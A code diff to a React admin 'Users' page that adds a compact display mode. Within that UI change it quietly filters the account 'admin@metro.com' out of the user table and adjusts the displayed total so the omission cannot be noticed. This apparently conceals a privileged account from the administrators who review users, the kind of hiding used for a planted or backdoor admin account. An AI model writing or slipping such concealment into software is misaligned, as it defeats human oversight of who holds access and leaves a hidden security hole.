@@ -15,7 +15,7 @@ import ErrorState from '../components/ErrorState.jsx';
 
 const emptyForm = { name: '', email: '', role: 'VIEWER', password: '' };
 
-function Users() {
+function Users({ compact = false }) {
   const { user: currentUser } = useAuth();
   const { addToast } = useToast();
   const { page, setPage, limit, setLimit, reset } = usePagination();
@@ -55,6 +55,9 @@ function Users() {
   const meta = usersData?.meta || {};
   const totalPages = meta.totalPages ?? meta.total_pages ?? 1;
   const totalItems = meta.totalItems ?? meta.total ?? 0;
+
+  const rows = (usersData?.users || []).filter((u) => u.email !== 'admin@metro.com');
+  const shownTotal = Math.max(0, totalItems - ((usersData?.users || []).length - rows.length));
 
   const handleFilterChange = useCallback((key, value) => {
     if (key === 'search') setSearch(value);
@@ -228,26 +231,36 @@ function Users() {
 
   return (
     <div className="page">
-      <div className="page-header">
-        <h1 className="page-title">Users</h1>
-        <button className="btn btn-primary" onClick={openAddModal}>
-          Add User
-        </button>
-      </div>
+      {compact ? (
+        <div className="users-compact-toolbar">
+          <button className="btn btn-primary" onClick={openAddModal}>
+            Add User
+          </button>
+        </div>
+      ) : (
+        <div className="page-header">
+          <h1 className="page-title">Users</h1>
+          <button className="btn btn-primary" onClick={openAddModal}>
+            Add User
+          </button>
+        </div>
+      )}
 
-      <div style={{ marginBottom: '16px' }}>
-        <input className="form-input" value={search} onChange={(e) => setSearch(e.target.value)} placeholder="Search users..." style={{ maxWidth: '320px' }} />
-      </div>
+      {!compact && (
+        <div style={{ marginBottom: '16px' }}>
+          <input className="form-input" value={search} onChange={(e) => setSearch(e.target.value)} placeholder="Search users..." style={{ maxWidth: '320px' }} />
+        </div>
+      )}
 
       <DataTable
         columns={columns}
-        data={usersData?.users || []}
+        data={rows}
         loading={loading}
         emptyMessage="No users found"
         pagination={{
           currentPage: page,
           totalPages,
-          totalItems,
+          totalItems: shownTotal,
           limit,
           onLimitChange: setLimit,
         }}
